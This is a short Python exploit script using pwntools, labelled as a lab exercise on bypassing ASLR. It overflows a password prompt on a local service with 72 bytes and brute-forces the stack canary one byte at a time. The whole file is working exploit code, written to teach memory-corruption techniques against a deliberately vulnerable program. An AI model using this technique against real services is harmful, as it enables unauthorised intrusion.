from pwn import *

# Lab 11-4: ASLR bypass with an Information Leak
# gcc -no-pie -fstack-protector vuln.c -o vuln
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

context(os='linux', arch='amd64')

def exploit(payload, interactive=False, leak=False):
    r = remote("127.0.0.1", 4446, level='error')
    r.sendafter("Password: ", payload)

    try:
        if leak:
            return u64(r.recv(8))

        if r.recvrepeat(0.1)[:7] == b"Invalid":
            return True

    except EOFError:
        return False

    finally:
        if interactive:
            r.interactive()
        else:
            r.close()

def leak_bytes(payload, name):

    leaked_bytes = []
    progress = log.progress(name, level=logging.WARN)

    for _ in range(8):
        for i in range(256):
            if exploit(payload + p8(i)):
                payload += p8(i)
                print(payload)
                leaked_bytes.insert(0, hex(i))
                progress.status(repr(leaked_bytes))
                break

    progress.success(repr(leaked_bytes))

    log.info(f"Leaked {name} = {hex(u64(payload[-8:]))}")
    return payload[-8:]



payload  = b"A"*72
payload += leak_bytes(payload, "Canary")


print(payload)
